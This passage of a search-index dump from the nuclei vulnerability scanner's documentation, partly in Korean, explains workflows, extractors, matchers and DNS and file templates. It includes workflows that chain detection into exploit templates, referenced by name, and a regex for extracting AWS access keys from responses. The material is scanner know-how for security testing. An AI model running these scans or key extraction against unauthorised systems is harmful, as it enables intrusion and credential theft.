subtemplates : - tags : jira - template : exploits/jira/ matcher \uc774\ub984 \uae30\ubc18 \uc870\uac74 \uccb4\ud06c \uacb0\uacfc\uc5d0\uc11c \uae30\ubcf8 \ud15c\ud50c\ub9bf\uc758 matcher\uac00 \ubc1c\uacac\ub418\uba74 \ud558\uc704 \ud15c\ud50c\ub9bf\uc744 \uc2e4\ud589\ud558\ub294 workflow. workflows : - template : technologies/tech-detect.yaml matchers : - name : vbulletin subtemplates : - template : exploits/vbulletin-exp1.yaml - template : exploits/vbulletin-exp2.yaml - name : jboss subtemplates : - template : exploits/jboss-exp1.yaml - template : exploits/jboss-exp2.yaml \ube44\uc2b7\ud55c \ubc29\uc2dd\uc73c\ub85c \ud544\uc694\ud55c \ub9cc\ud07c workflow\uc5d0 \ub300\ud55c \uc911\ucca9 \uac80\uc0ac\ub97c \ub9cc\ub4e4 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud558\uc704 \ud15c\ud50c\ub9bf\uacfc matcher \uc774\ub984 \uae30\ubc18 \ub2e4\uc911 \ub808\ubca8 \uc870\uac74 \uccb4\ud06c \uc774\uc804 \ud15c\ud50c\ub9bf\uc774 \uc77c\uce58\ud558\ub294 \uacbd\uc6b0\uc5d0\ub9cc \uc2e4\ud589\ub418\ub294 \ud15c\ud50c\ub9bf \uc2e4\ud589 \uccb4\uc778\uc744 \ubcf4\uc5ec\uc8fc\ub294 workflow. workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml conditional workflows\ub294 \ubaa8\ub4e0 \ub300\uc0c1\uc5d0 \ubaa8\ub4e0 \ud15c\ud50c\ub9bf\uc744 \uc801\uc6a9\ud558\ub294 \ub300\uc2e0 \uac00\uc7a5 \ud6a8\uc728\uc801\uc778 \ubc29\uc2dd\uc73c\ub85c \uac80\uc0ac \ubc0f \ucde8\uc57d\uc131 \ud0d0\uc9c0\ub97c \uc218\ud589\ud558\ub294 \uc88b\uc740 \uc608\uc774\uba70 \uc77c\ubc18\uc801\uc73c\ub85c \uc2dc\uac04\uc5d0 \ub300\ud55c ROI\uac00 \uc6b0\uc218\ud558\uace0 \ub300\uc0c1\uc5d0\ub3c4 \uc801\ud569\ud569\ub2c8\ub2e4. \ub354 \uc644\uc804\ud55c workflow \uc608\uc81c\ub4e4\uc740 here \uc5d0\uc11c \uc81c\uacf5\ub429\ub2c8\ub2e4.","title":"Conditional Workflows (\uc870\uac74\ubd80 \uc791\uc5c5\ud750\ub984)"},{"location":"kr/templating-guide/operators/extractors/","text":"Extractors \u00b6 Extractors can be used to extract and display in results a match from the response returned by a module. Types \u00b6 Multiple extractors can be specified in a request. As of now we support two type of extractors. regex - Extract data from response based on a Regular Expression. kval - Extract key: value / key=value formatted data from Response Header/Cookie json - Extract data from JSON based response in JQ like syntax. xpath - Extract xpath based data from HTML Response dsl - Extract data from the response based on a DSL expressions. Regex Extractor \u00b6 Example extractor for HTTP Response body using regex - extractors : - type : regex # type of the extractor part : body # part of the response (header,body,all) regex : - \"(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\" # regex to use for extraction. Kval Extractor \u00b6 A kval extractor example to extract content-type header from HTTP Response. extractors : - type : kval # type of the extractor kval : - content_type # header/cookie value to extract from response Note that content-type has been replaced with content_type because kval extractor does not accept dash ( - ) as input and must be substituted with underscore ( _ ). JSON Extractor \u00b6 A json extractor example to extract value of id object from JSON block. - type : json # type of the extractor part : body name : user json : - '.[] | .id' # JQ like syntax for extraction For more details about JQ - https://github.com/stedolan/jq Xpath Extractor \u00b6 A xpath extractor example to extract value of href attribute from HTML response. extractors : - type : xpath # type of the extractor attribute : href # attribute value to extract (optional) xpath : - \"/html/body/div/p[2]/a\" # xpath value for extraction With a simple copy paste in browser , we can get the xpath value form any web page content. DSL Extractor \u00b6 A dsl extractor example to extract the effective body length through the len helper function from HTTP Response. extractors : - type : dsl # type of the extractor dsl : - \"len(body)\" # dsl expression value to extract from response Dynamic Extractor \u00b6 Extractors can be used to capture Dynamic Values on runtime while writing Multi-Request templates. CSRF Tokens, Session Headers, etc. can be extracted and used in requests. This feature is only available in RAW request format. Example of defining a dynamic extractor with name api which will capture a regex based pattern from the request. extractors : - type : regex name : api part : body internal : true # Required for using dynamic variables regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" The extracted value is stored in the variable api , which can be utilised in any section of the subsequent requests. If you want to use extractor as a dynamic variable, you must use internal: true to avoid printing extracted values in the terminal. An optional regex match-group can also be specified for the regex for more complex matches. extractors : - type : regex # type of extractor name : csrf_token # defining the variable name part : body # part of response to look for # group defines the matching group being used. # In GO the \"match\" is the full array of all matches and submatches # match[0] is the full match # match[n] is the submatches. Most often we'd want match[1] as depicted below group : 1 regex : - '<input\\sname=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\"\\s/>' The above extractor with name csrf_token will hold the value extracted by ([[:alnum:]]{16}) as abcdefgh12345678 . If no group option is provided with this regex, the above extractor with name csrf_html_tag will hold the full match (by <input name=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\" /> ) as <input name=\"csrf_token\" type=\"hidden\" value=\"abcdefgh12345678\" /> .","title":"Extractors"},{"location":"kr/templating-guide/operators/extractors/#extractors","text":"Extractors can be used to extract and display in results a match from the response returned by a module.","title":"Extractors"},{"location":"kr/templating-guide/operators/extractors/#types","text":"Multiple extractors can be specified in a request. As of now we support two type of extractors. regex - Extract data from response based on a Regular Expression. kval - Extract key: value / key=value formatted data from Response Header/Cookie json - Extract data from JSON based response in JQ like syntax. xpath - Extract xpath based data from HTML Response dsl - Extract data from the response based on a DSL expressions.","title":"Types"},{"location":"kr/templating-guide/operators/extractors/#regex-extractor","text":"Example extractor for HTTP Response body using regex - extractors : - type : regex # type of the extractor part : body # part of the response (header,body,all) regex : - \"(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\" # regex to use for extraction.","title":"Regex Extractor"},{"location":"kr/templating-guide/operators/extractors/#kval-extractor","text":"A kval extractor example to extract content-type header from HTTP Response. extractors : - type : kval # type of the extractor kval : - content_type # header/cookie value to extract from response Note that content-type has been replaced with content_type because kval extractor does not accept dash ( - ) as input and must be substituted with underscore ( _ ).","title":"Kval Extractor"},{"location":"kr/templating-guide/operators/extractors/#json-extractor","text":"A json extractor example to extract value of id object from JSON block. - type : json # type of the extractor part : body name : user json : - '.[] | .id' # JQ like syntax for extraction For more details about JQ - https://github.com/stedolan/jq","title":"JSON Extractor"},{"location":"kr/templating-guide/operators/extractors/#xpath-extractor","text":"A xpath extractor example to extract value of href attribute from HTML response. extractors : - type : xpath # type of the extractor attribute : href # attribute value to extract (optional) xpath : - \"/html/body/div/p[2]/a\" # xpath value for extraction With a simple copy paste in browser , we can get the xpath value form any web page content.","title":"Xpath Extractor"},{"location":"kr/templating-guide/operators/extractors/#dsl-extractor","text":"A dsl extractor example to extract the effective body length through the len helper function from HTTP Response. extractors : - type : dsl # type of the extractor dsl : - \"len(body)\" # dsl expression value to extract from response","title":"DSL Extractor"},{"location":"kr/templating-guide/operators/extractors/#dynamic-extractor","text":"Extractors can be used to capture Dynamic Values on runtime while writing Multi-Request templates. CSRF Tokens, Session Headers, etc. can be extracted and used in requests. This feature is only available in RAW request format. Example of defining a dynamic extractor with name api which will capture a regex based pattern from the request. extractors : - type : regex name : api part : body internal : true # Required for using dynamic variables regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" The extracted value is stored in the variable api , which can be utilised in any section of the subsequent requests. If you want to use extractor as a dynamic variable, you must use internal: true to avoid printing extracted values in the terminal. An optional regex match-group can also be specified for the regex for more complex matches. extractors : - type : regex # type of extractor name : csrf_token # defining the variable name part : body # part of response to look for # group defines the matching group being used. # In GO the \"match\" is the full array of all matches and submatches # match[0] is the full match # match[n] is the submatches. Most often we'd want match[1] as depicted below group : 1 regex : - '<input\\sname=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\"\\s/>' The above extractor with name csrf_token will hold the value extracted by ([[:alnum:]]{16}) as abcdefgh12345678 . If no group option is provided with this regex, the above extractor with name csrf_html_tag will hold the full match (by <input name=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\" /> ) as <input name=\"csrf_token\" type=\"hidden\" value=\"abcdefgh12345678\" /> .","title":"Dynamic Extractor"},{"location":"kr/templating-guide/operators/matchers/","text":"Matchers \u00b6 Matchers allow different type of flexible comparisons on protocol responses. They are what makes nuclei so powerful, checks are very simple to write and multiple checks can be added as per need for very effective scanning. Types \u00b6 Multiple matchers can be specified in a request. There are basically 6 types of matchers: Matcher Type Part Matched status Integer Comparisons of Part size Content Length of Part word Part for a protocol regex Part for a protocol binary Part for a protocol dsl Part for a protocol To match status codes for responses, you can use the following syntax. matchers : # Match the status codes - type : status # Some status codes we want to match status : - 200 - 302 To match binary for hexadecimal responses, you can use the following syntax. matchers : - type : binary binary : - \"504B0304\" # zip archive - \"526172211A070100\" # RAR archive version 5.0 - \"FD377A585A0000\" # xz tar.xz archive condition : or part : body Matchers also support hex encoded data which will be decoded and matched. matchers : - type : word encoding : hex words : - \"50494e47\" part : body Word and Regex matchers can be further configured depending on the needs of the users. Complex matchers of type dsl allows building more elaborate expressions with helper functions. These function allow access to Protocol Response which contains variety of data based on each protocol. See protocol specific documentation to learn about different returned results. matchers : - type : dsl dsl : - \"len(body)<1024 && status_code==200\" # Body length less than 1024 and 200 status code - \"contains(toupper(body), md5(cookie))\" # Check if the MD5 sum of cookies is contained in the uppercase body Every part of a Protocol response can be matched with DSL matcher. Some examples - Response Part Description Example content_length Content-Length Header content_length >= 1024 status_code Response Status Code status_code==200 all_headers Unique string containing all headers len(all_headers) body Body as string len(body) header_name Lowercase header name with - converted to _ len(user_agent) raw Headers + Response len(raw) Conditions \u00b6 Multiple words and regexes can be specified in a single matcher and can be configured with different conditions like AND and OR . AND - Using AND conditions allows matching of all the words from the list of words for the matcher. Only then will the request be marked as successful when all the words have been matched. OR - Using OR conditions allows matching of a single word from the list of matcher. The request will be marked as successful when even one of the word is matched for the matcher. Matched Parts \u00b6 Multiple parts of the response can also be matched for the request, default matched part is body if not defined. Example matchers for HTTP response body using the AND condition: matchers : # Match the body word - type : word # Some words we want to match words : - \"[core]\" - \"[config]\" # Both words must be found in the response body condition : and # We want to match request body (default) part : body Similarly, matchers can be written to match anything that you want to find in the response body allowing unlimited creativity and extensibility. Negative Matchers \u00b6 All types of matchers also support negative conditions, mostly useful when you look for a match with an exclusions. This can be used by adding negative: true in the matchers block. Here is an example syntax using negative condition, this will return all the URLs not having PHPSESSID in the response header. matchers : - type : word words : - \"PHPSESSID\" part : header negative : true Multiple Matchers \u00b6 Multiple matchers can be used in a single template to fingerprint multiple conditions with a single request. Here is an example of syntax for multiple matchers. matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" condition : or part : header Matchers Condition \u00b6 While using multiple matchers the default condition is to follow OR operation in between all the matchers, AND operation can be used to make sure return the result if all matchers returns true. matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - \"PHP\" part : body","title":"Matchers"},{"location":"kr/templating-guide/operators/matchers/#matchers","text":"Matchers allow different type of flexible comparisons on protocol responses. They are what makes nuclei so powerful, checks are very simple to write and multiple checks can be added as per need for very effective scanning.","title":"Matchers"},{"location":"kr/templating-guide/operators/matchers/#types","text":"Multiple matchers can be specified in a request. There are basically 6 types of matchers: Matcher Type Part Matched status Integer Comparisons of Part size Content Length of Part word Part for a protocol regex Part for a protocol binary Part for a protocol dsl Part for a protocol To match status codes for responses, you can use the following syntax. matchers : # Match the status codes - type : status # Some status codes we want to match status : - 200 - 302 To match binary for hexadecimal responses, you can use the following syntax. matchers : - type : binary binary : - \"504B0304\" # zip archive - \"526172211A070100\" # RAR archive version 5.0 - \"FD377A585A0000\" # xz tar.xz archive condition : or part : body Matchers also support hex encoded data which will be decoded and matched. matchers : - type : word encoding : hex words : - \"50494e47\" part : body Word and Regex matchers can be further configured depending on the needs of the users. Complex matchers of type dsl allows building more elaborate expressions with helper functions. These function allow access to Protocol Response which contains variety of data based on each protocol. See protocol specific documentation to learn about different returned results. matchers : - type : dsl dsl : - \"len(body)<1024 && status_code==200\" # Body length less than 1024 and 200 status code - \"contains(toupper(body), md5(cookie))\" # Check if the MD5 sum of cookies is contained in the uppercase body Every part of a Protocol response can be matched with DSL matcher. Some examples - Response Part Description Example content_length Content-Length Header content_length >= 1024 status_code Response Status Code status_code==200 all_headers Unique string containing all headers len(all_headers) body Body as string len(body) header_name Lowercase header name with - converted to _ len(user_agent) raw Headers + Response len(raw)","title":"Types"},{"location":"kr/templating-guide/operators/matchers/#conditions","text":"Multiple words and regexes can be specified in a single matcher and can be configured with different conditions like AND and OR . AND - Using AND conditions allows matching of all the words from the list of words for the matcher. Only then will the request be marked as successful when all the words have been matched. OR - Using OR conditions allows matching of a single word from the list of matcher. The request will be marked as successful when even one of the word is matched for the matcher.","title":"Conditions"},{"location":"kr/templating-guide/operators/matchers/#matched-parts","text":"Multiple parts of the response can also be matched for the request, default matched part is body if not defined. Example matchers for HTTP response body using the AND condition: matchers : # Match the body word - type : word # Some words we want to match words : - \"[core]\" - \"[config]\" # Both words must be found in the response body condition : and # We want to match request body (default) part : body Similarly, matchers can be written to match anything that you want to find in the response body allowing unlimited creativity and extensibility.","title":"Matched Parts"},{"location":"kr/templating-guide/operators/matchers/#negative-matchers","text":"All types of matchers also support negative conditions, mostly useful when you look for a match with an exclusions. This can be used by adding negative: true in the matchers block. Here is an example syntax using negative condition, this will return all the URLs not having PHPSESSID in the response header. matchers : - type : word words : - \"PHPSESSID\" part : header negative : true","title":"Negative Matchers"},{"location":"kr/templating-guide/operators/matchers/#multiple-matchers","text":"Multiple matchers can be used in a single template to fingerprint multiple conditions with a single request. Here is an example of syntax for multiple matchers. matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" condition : or part : header","title":"Multiple Matchers"},{"location":"kr/templating-guide/operators/matchers/#matchers-condition","text":"While using multiple matchers the default condition is to follow OR operation in between all the matchers, AND operation can be used to make sure return the result if all matchers returns true. matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - \"PHP\" part : body","title":"Matchers Condition"},{"location":"kr/templating-guide/protocols/dns/","text":"DNS Requests \u00b6 DNS protocol\uc740 nuclei\uc5d0\uc11c \uc27d\uac8c \ubaa8\ub378\ub9c1\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc644\uc804\ud788 \uc0ac\uc6a9\uc790 \uc815\uc758 \uac00\ub2a5\ud55c DNS \uc694\uccad\uc740 nuclei\uc5d0 \uc758\ud574 \ub124\uc784\uc11c\ubc84\ub85c \uc804\uc1a1\ub420 \uc218 \uc788\uc73c\uba70 \uc751\ub2f5\uc5d0 \ub300\ud574 \uc77c\uce58/\ucd94\ucd9c\uc774 \uc218\ud589\ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. DNS \uc694\uccad\uc740 \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c \uc694\uccad\uc758 \uc2dc\uc791\uc744 \uc9c0\uc815\ud558\ub294 dns \ube14\ub85d\uc73c\ub85c \uc2dc\uc791\ud569\ub2c8\ub2e4. # \ud15c\ud50c\ub9bf \uc694\uccad\uc744 \ubc14\ub85c \uc5ec\uae30\uc5d0\uc11c \uc2dc\uc791\ud558\uc138\uc694. dns : Type \u00b6 \uc694\uccad\uc0ac\ud56d\uc758 \uccab \ubc88\uc9f8\ub294 type**\uc785\ub2c8\ub2e4. \uc694\uccad \uc720\ud615\uc740 **A , NS , CNAME , SOA , PTR , MX , TXT , **AAAA**\uc785\ub2c8\ub2e4. # type\uc740 DNS \uc694\uccad\uc5d0 \ub300\ud55c \uc720\ud615\uc785\ub2c8\ub2e4. type : A Name \u00b6 \uc694\uccad\uc758 \ub2e4\uc74c \ubd80\ubd84\uc740 \ud574\uacb0\ud560 DNS **name**\uc785\ub2c8\ub2e4. \ub3d9\uc801 \ubcc0\uc218\ub97c \uacbd\ub85c\uc5d0 \ubc30\uce58\ud558\uc5ec \ub7f0\ud0c0\uc784\uc5d0 \uac12\uc744 \uc218\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ubcc0\uc218\ub294 '{{'\ub85c \uc2dc\uc791\ud558\uace0 '}}'\ub85c \ub05d\ub098\uba70 \ub300\uc18c\ubb38\uc790\ub97c \uad6c\ubd84\ud569\ub2c8\ub2e4. FQDN - \ubcc0\uc218\ub294 \ub7f0\ud0c0\uc784 \uc2dc \ub300\uc0c1\uc758 \ud638\uc2a4\ud2b8 \uc774\ub984/FQDN\uc73c\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. \uc608\uc81c \uc774\ub984 \uac12: name : {{ FQDN }} .com # \uc774 \uac12\uc740 \uc2e4\ud589 \uc2dc FQDN\uc73c\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. # FQDN\uc774 https://this.is.an.example\uc774\uba74 # name\uc740 \ub2e4\uc74c\uc73c\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4: this.is.an.example.com \ud604\uc7ac \uc774 \ub3c4\uad6c\ub294 \uc694\uccad\ub2f9 \ud558\ub098\uc758 \uc774\ub984\ub9cc \uc9c0\uc6d0\ud569\ub2c8\ub2e4. Class \u00b6 \ud074\ub798\uc2a4 \uc720\ud615\uc740 INET , CSNET , CHAOS , HESIOD , NONE \ubc0f **ANY**\uc77c \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc77c\ubc18\uc801\uc73c\ub85c **INET**\uc73c\ub85c \ub450\ub294 \uac83\uc73c\ub85c \ucda9\ubd84\ud569\ub2c8\ub2e4. # \uba54\uc18c\ub4dc\ub294 dns \uc694\uccad\uc5d0 \ub300\ud55c \ud074\ub798\uc2a4\uc785\ub2c8\ub2e4. class : inet Recursion \u00b6 \uc7ac\uadc0\ub294 \ubd80\uc6b8 \uac12\uc774\uba70 \ud574\uc11d\uae30\uac00 \uce90\uc2dc\ub41c \uacb0\uacfc\ub9cc \ubc18\ud658\ud574\uc57c \ud558\ub294\uc9c0 \uc544\ub2c8\uba74 \uc804\uccb4 DNS \ub8e8\ud2b8 \ud2b8\ub9ac\ub97c \ud0d0\uc0c9\ud558\uc5ec \uc0c8\ub85c\uc6b4 \uacb0\uacfc\ub97c \uac80\uc0c9\ud574\uc57c \ud558\ub294\uc9c0\ub97c \uacb0\uc815\ud569\ub2c8\ub2e4. \uc77c\ubc18\uc801\uc73c\ub85c **true**\ub85c \ub450\ub294 \uac83\uc774 \uc88b\uc2b5\ub2c8\ub2e4. # \uc7ac\uadc0\ub294 \uc694\uccad\uc774 \uc7ac\uadc0\uc778\uc9c0 \uc5ec\ubd80\ub97c \uacb0\uc815\ud558\ub294 \ubd80\uc6b8\uc785\ub2c8\ub2e4. recursion : true Retries \u00b6 Retries\ub294 \ub2e4\ub978 \ud655\uc778\uc790 \uac04\uc5d0 \ud3ec\uae30\ud558\uae30 \uc804\uc5d0 DNS \ucffc\ub9ac\ub97c \ub2e4\uc2dc \uc2dc\ub3c4\ud55c \ud69f\uc218\uc785\ub2c8\ub2e4. **3**\uacfc \uac19\uc740 \ud569\ub9ac\uc801\uc778 \uac12\uc744 \uad8c\uc7a5\ud569\ub2c8\ub2e4. # Retries\ub294 dns \ud574\uacb0\uc744 \ud3ec\uae30\ud558\uae30 \uc804\uc758 \uc7ac\uc2dc\ub3c4 \ud69f\uc218\uc785\ub2c8\ub2e4. retries : 3 Matchers / Extractor Parts \u00b6 Matchers/Extractor\uc6a9 DNS \ud504\ub85c\ud1a0\ucf5c\uc5d0\uc11c \uc9c0\uc6d0\ud558\ub294 \uc720\ud6a8\ud55c part \uac12\uc740 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. Value Description request DNS Request rcode DNS Rcode question DNS Question Message extra DNS Message Extra Field answer DNS Message Answer Field ns DNS Message Authority Field raw / all / body Raw DNS Message Example DNS Template \u00b6 A \ucffc\ub9ac\ub97c \uc218\ud589\ud558\uace0 \uc751\ub2f5\uc5d0 CNAME \ubc0f A \ub808\ucf54\ub4dc\uac00 \uc788\ub294\uc9c0 \ud655\uc778\ud558\uae30 \uc704\ud55c \ucd5c\uc885 \uc608\uc81c \ud15c\ud50c\ub9bf \ud30c\uc77c\uc740 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. id : dummy-cname-a info : name : Dummy A dns request author : mzack9999 severity : none description : Checks if CNAME and A record is returned. dns : - name : \"{{FQDN}}\" type : A class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contain a CNAME record - \"IN\\tCNAME\" # and also at least 1 A record - \"IN\\tA\" condition : and \ub354 \uc644\uc804\ud55c \uc608\uc81c\ub294 here \uc5d0\uc11c \uc81c\uacf5\ub429\ub2c8\ub2e4.","title":"Dns"},{"location":"kr/templating-guide/protocols/dns/#dns-requests","text":"DNS protocol\uc740 nuclei\uc5d0\uc11c \uc27d\uac8c \ubaa8\ub378\ub9c1\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc644\uc804\ud788 \uc0ac\uc6a9\uc790 \uc815\uc758 \uac00\ub2a5\ud55c DNS \uc694\uccad\uc740 nuclei\uc5d0 \uc758\ud574 \ub124\uc784\uc11c\ubc84\ub85c \uc804\uc1a1\ub420 \uc218 \uc788\uc73c\uba70 \uc751\ub2f5\uc5d0 \ub300\ud574 \uc77c\uce58/\ucd94\ucd9c\uc774 \uc218\ud589\ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. DNS \uc694\uccad\uc740 \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c \uc694\uccad\uc758 \uc2dc\uc791\uc744 \uc9c0\uc815\ud558\ub294 dns \ube14\ub85d\uc73c\ub85c \uc2dc\uc791\ud569\ub2c8\ub2e4. # \ud15c\ud50c\ub9bf \uc694\uccad\uc744 \ubc14\ub85c \uc5ec\uae30\uc5d0\uc11c \uc2dc\uc791\ud558\uc138\uc694. dns :","title":"DNS Requests"},{"location":"kr/templating-guide/protocols/dns/#type","text":"\uc694\uccad\uc0ac\ud56d\uc758 \uccab \ubc88\uc9f8\ub294 type**\uc785\ub2c8\ub2e4. \uc694\uccad \uc720\ud615\uc740 **A , NS , CNAME , SOA , PTR , MX , TXT , **AAAA**\uc785\ub2c8\ub2e4. # type\uc740 DNS \uc694\uccad\uc5d0 \ub300\ud55c \uc720\ud615\uc785\ub2c8\ub2e4. type : A","title":"Type"},{"location":"kr/templating-guide/protocols/dns/#name","text":"\uc694\uccad\uc758 \ub2e4\uc74c \ubd80\ubd84\uc740 \ud574\uacb0\ud560 DNS **name**\uc785\ub2c8\ub2e4. \ub3d9\uc801 \ubcc0\uc218\ub97c \uacbd\ub85c\uc5d0 \ubc30\uce58\ud558\uc5ec \ub7f0\ud0c0\uc784\uc5d0 \uac12\uc744 \uc218\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ubcc0\uc218\ub294 '{{'\ub85c \uc2dc\uc791\ud558\uace0 '}}'\ub85c \ub05d\ub098\uba70 \ub300\uc18c\ubb38\uc790\ub97c \uad6c\ubd84\ud569\ub2c8\ub2e4. FQDN - \ubcc0\uc218\ub294 \ub7f0\ud0c0\uc784 \uc2dc \ub300\uc0c1\uc758 \ud638\uc2a4\ud2b8 \uc774\ub984/FQDN\uc73c\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. \uc608\uc81c \uc774\ub984 \uac12: name : {{ FQDN }} .com # \uc774 \uac12\uc740 \uc2e4\ud589 \uc2dc FQDN\uc73c\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. # FQDN\uc774 https://this.is.an.example\uc774\uba74 # name\uc740 \ub2e4\uc74c\uc73c\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4: this.is.an.example.com \ud604\uc7ac \uc774 \ub3c4\uad6c\ub294 \uc694\uccad\ub2f9 \ud558\ub098\uc758 \uc774\ub984\ub9cc \uc9c0\uc6d0\ud569\ub2c8\ub2e4.","title":"Name"},{"location":"kr/templating-guide/protocols/dns/#class","text":"\ud074\ub798\uc2a4 \uc720\ud615\uc740 INET , CSNET , CHAOS , HESIOD , NONE \ubc0f **ANY**\uc77c \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc77c\ubc18\uc801\uc73c\ub85c **INET**\uc73c\ub85c \ub450\ub294 \uac83\uc73c\ub85c \ucda9\ubd84\ud569\ub2c8\ub2e4. # \uba54\uc18c\ub4dc\ub294 dns \uc694\uccad\uc5d0 \ub300\ud55c \ud074\ub798\uc2a4\uc785\ub2c8\ub2e4. class : inet","title":"Class"},{"location":"kr/templating-guide/protocols/dns/#recursion","text":"\uc7ac\uadc0\ub294 \ubd80\uc6b8 \uac12\uc774\uba70 \ud574\uc11d\uae30\uac00 \uce90\uc2dc\ub41c \uacb0\uacfc\ub9cc \ubc18\ud658\ud574\uc57c \ud558\ub294\uc9c0 \uc544\ub2c8\uba74 \uc804\uccb4 DNS \ub8e8\ud2b8 \ud2b8\ub9ac\ub97c \ud0d0\uc0c9\ud558\uc5ec \uc0c8\ub85c\uc6b4 \uacb0\uacfc\ub97c \uac80\uc0c9\ud574\uc57c \ud558\ub294\uc9c0\ub97c \uacb0\uc815\ud569\ub2c8\ub2e4. \uc77c\ubc18\uc801\uc73c\ub85c **true**\ub85c \ub450\ub294 \uac83\uc774 \uc88b\uc2b5\ub2c8\ub2e4. # \uc7ac\uadc0\ub294 \uc694\uccad\uc774 \uc7ac\uadc0\uc778\uc9c0 \uc5ec\ubd80\ub97c \uacb0\uc815\ud558\ub294 \ubd80\uc6b8\uc785\ub2c8\ub2e4. recursion : true","title":"Recursion"},{"location":"kr/templating-guide/protocols/dns/#retries","text":"Retries\ub294 \ub2e4\ub978 \ud655\uc778\uc790 \uac04\uc5d0 \ud3ec\uae30\ud558\uae30 \uc804\uc5d0 DNS \ucffc\ub9ac\ub97c \ub2e4\uc2dc \uc2dc\ub3c4\ud55c \ud69f\uc218\uc785\ub2c8\ub2e4. **3**\uacfc \uac19\uc740 \ud569\ub9ac\uc801\uc778 \uac12\uc744 \uad8c\uc7a5\ud569\ub2c8\ub2e4. # Retries\ub294 dns \ud574\uacb0\uc744 \ud3ec\uae30\ud558\uae30 \uc804\uc758 \uc7ac\uc2dc\ub3c4 \ud69f\uc218\uc785\ub2c8\ub2e4. retries : 3","title":"Retries"},{"location":"kr/templating-guide/protocols/dns/#matchers-extractor-parts","text":"Matchers/Extractor\uc6a9 DNS \ud504\ub85c\ud1a0\ucf5c\uc5d0\uc11c \uc9c0\uc6d0\ud558\ub294 \uc720\ud6a8\ud55c part \uac12\uc740 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. Value Description request DNS Request rcode DNS Rcode question DNS Question Message extra DNS Message Extra Field answer DNS Message Answer Field ns DNS Message Authority Field raw / all / body Raw DNS Message","title":"Matchers / Extractor Parts"},{"location":"kr/templating-guide/protocols/dns/#example-dns-template","text":"A \ucffc\ub9ac\ub97c \uc218\ud589\ud558\uace0 \uc751\ub2f5\uc5d0 CNAME \ubc0f A \ub808\ucf54\ub4dc\uac00 \uc788\ub294\uc9c0 \ud655\uc778\ud558\uae30 \uc704\ud55c \ucd5c\uc885 \uc608\uc81c \ud15c\ud50c\ub9bf \ud30c\uc77c\uc740 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. id : dummy-cname-a info : name : Dummy A dns request author : mzack9999 severity : none description : Checks if CNAME and A record is returned. dns : - name : \"{{FQDN}}\" type : A class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contain a CNAME record - \"IN\\tCNAME\" # and also at least 1 A record - \"IN\\tA\" condition : and \ub354 \uc644\uc804\ud55c \uc608\uc81c\ub294 here \uc5d0\uc11c \uc81c\uacf5\ub429\ub2c8\ub2e4.","title":"Example DNS Template"},{"location":"kr/templating-guide/protocols/file/","text":"File Requests \u00b6 Nuclei\ub294 \ud30c\uc77c \uc2dc\uc2a4\ud15c\uc5d0\uc11c\ub3c4 \uc77c\uce58/\ucd94\ucd9c\ud560 \uc218 \uc788\ub294 \ubaa8\ub378\ub9c1 \ud15c\ud50c\ub9bf\uc744 \ud5c8\uc6a9\ud569\ub2c8\ub2e4. # Start of file template block file : Extensions \u00b6 \ubaa8\ub4e0 \ud655\uc7a5\uc790(\uae30\ubcf8 \uac70\ubd80 \ubaa9\ub85d\uc5d0 \uc788\ub294 \ud655\uc7a5\uc790 \uc81c\uc678)\uc5d0\uc11c \uc77c\uce58\uc2dc\ud0a4\ub824\uba74 \ub2e4\uc74c\uc744 \uc0ac\uc6a9\ud558\uc2ed\uc2dc\uc624. extensions : - all \uc77c\uce58\ud574\uc57c \ud558\ub294 \uc0ac\uc6a9\uc790 \uc9c0\uc815 \ud655\uc7a5 \ubaa9\ub85d\uc744 \uc81c\uacf5\ud560 \uc218\ub3c4 \uc788\uc2b5\ub2c8\ub2e4. extensions : - py - go 